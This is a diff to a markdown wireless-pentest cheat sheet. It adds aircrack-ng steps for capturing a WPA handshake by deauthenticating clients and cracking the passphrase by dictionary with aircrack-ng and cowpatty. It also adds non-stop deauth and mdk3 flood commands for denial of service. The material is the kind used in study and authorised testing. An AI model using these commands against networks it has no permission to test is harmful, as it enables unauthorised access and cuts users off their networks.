@@ -291,7 +291,7 @@ Visit http://linux-wless.passys.nl to check native Linux support for wireless ch
 * Group Temporal Key (GTK) is used for Broadcast/Multicast encryption.
 * To run dictionary attack against passphrases of WPA(2)-PSK, the client MAC and AP MAC address, the ANonce and SNonce are required. So important to have strong passphrases if WPA-PSK2 is used.
 
-### Cracking
+### "Practical Auditing"
 
 #### Prep Chipsets (Monitor Mode and Frame Injection)
 * Set Wifi adapters to monitor mode by referring to "Commands For Changing Modes on Chipsets" in previous chapter.
@@ -322,10 +322,10 @@ Visit http://linux-wless.passys.nl to check native Linux support for wireless ch
 
 ###### No Client Associated Method 1 (May require MAC of previously-seen-associated victim) (May require changing own MAC to victim's, refer below*)
 
-* (Terminal 1 ) Get ESSID, BSSID, Client's MAC, Channel.  
+* Get ESSID, BSSID, Client's MAC, Channel.  
 `airodump-ng [interface]`
 
-* Attempts to associate with AP. Successful when "Association successful :)" appears and stays, with no deauthentication messages.  
+* Attempt to associate with AP. Successful when "Association successful :)" appears and stays, with no deauthentication messages.  
 `aireplay-ng --fakeauth 0 -a [MAC of AP] -h [Our/Client's MAC] -e [Name of AP] [interface]`
 `aireplay-ng --fakeauth 15 -a [MAC of AP] -h [Our/Client's MAC] -e [Name of AP] [interface]`  
 `aireplay-ng --fakeauth 5000 -o 1 -q 15 -a [MAC of AP] -h [Our/Client's MAC] -e [Name of AP] [interface]`  
@@ -342,7 +342,7 @@ Visit http://linux-wless.passys.nl to check native Linux support for wireless ch
 * Get ESSID, BSSID, Client's MAC, Channel.  
 `airodump-ng [interface]`
 
-* Attempts to associate with AP. Successful when "Association successful :)" appears and stays, with no deauthentication messages.  
+* Attempt to associate with AP. Successful when "Association successful :)" appears and stays, with no deauthentication messages.  
 `aireplay-ng --fakeauth 15 -a [MAC of AP] -h [Our/Client's MAC] -e [Name of AP] [interface]`  
 `aireplay-ng --fakeauth 5000 -o 1 -q 15 -a [MAC of AP] -h [Our/Client's MAC] -e [Name of AP] [interface]`  
 `aireplay-ng --fakeauth 20 -o 1 -q 15 -a [MAC of AP] -h [Our/Client's MAC] -e [Name of AP] [interface]`
@@ -358,7 +358,7 @@ Visit http://linux-wless.passys.nl to check native Linux support for wireless ch
 * Get ESSID, BSSID, Client's MAC, Channel.  
 `airodump-ng [interface]`
 
-* Attempts to associate with AP. Successful when "Association successful :)" appears and stays, with no deauthentication messages.  
+* Attempt to associate with AP. Successful when "Association successful :)" appears and stays, with no deauthentication messages.  
 `aireplay-ng --fakeauth 15 -a [MAC of AP] -h [Our/Client's MAC] -e [Name of AP] [interface]`  
 `aireplay-ng --fakeauth 5000 -o 1 -q 15 -a [MAC of AP] -h [Our/Client's MAC] -e [Name of AP] [interface]`  
 `aireplay-ng --fakeauth 20 -o 1 -q 15 -a [MAC of AP] -h [Our/Client's MAC] -e [Name of AP] [interface]`
@@ -405,3 +405,44 @@ Visit http://linux-wless.passys.nl to check native Linux support for wireless ch
 #### WPA Cracking
 
 ##### Capturing 4-Way Handshake
+
+* Get ESSID, BSSID, Client's MAC, Channel.  
+`airodump-ng [interface]`
+
+* Prep an airodump to capture 4-way handshake packets.  
+`airodump-ng --bssid=[MAC of AP] -c [channel] -w [filename] [interface]`
+
+* Deauths client to force the client to reconnect and perform a 4-way handshake.  
+`aireplay-ng --deauth 2 -a [MAC of AP] -c [Client's MAC] [interface]`
+
+##### Validating 4-Way Handshake PCAP
+
+1. Open pcap file in Wireshark.
+2. Filter with `eapol`.
+3. A complete handshake includes 4 packets.
+   * Look for packets from AP with Nonce. This is Packet 1 of 4-way handshake.
+   * The first pair of packets (the ones required to crack PSK) has a "replay counter" value of 1.
+   * The second pair has a "replay counter" value of 2.
+   * Packets with the same "replay counter" value are matching sets.
+   * EAPOL packets 1 and 3 should have the same Nonce value.
+
+##### Cracking WPA PSK
+
+* Crack with dictionary
+`aircrack-ng -a 2 -e [Name of AP] -b [MAC of AP] -w [dictionary] [4-way handshake PCAP]` (seems fast and reliable)
+`cowpatty -f [dictionary] -r [4-way handshake PCAP] -s [Name of AP]`
+`cowpatty -2 -f [dictionary] -r [4-way handshake PCAP] -s [Name of AP]` (uses first 2 EAPOL packets)
+
+#### DoS
+
+##### Aireplay-ng DoS
+
+`aireplay-ng --deauth 0 -a [MAC of AP] -c [Client's MAC] [interface]` (deauth certain client non-stop)  
+`aireplay-ng --deauth 0 -a [MAC of AP] [interface]` (deauth all in network non-stop)
+
+##### MDK3 DoS
+
+`mdk3 [interface] d` (deauth everyone, slow when there are many connections)
+`mdk3 [interface] d -b [blacklist w/ AP MACs] -c [channel]` (deauth networks listed in blacklist)
+`mdk3 [interface] a -i [MAC of AP]` (authentication dos a certain AP)
+
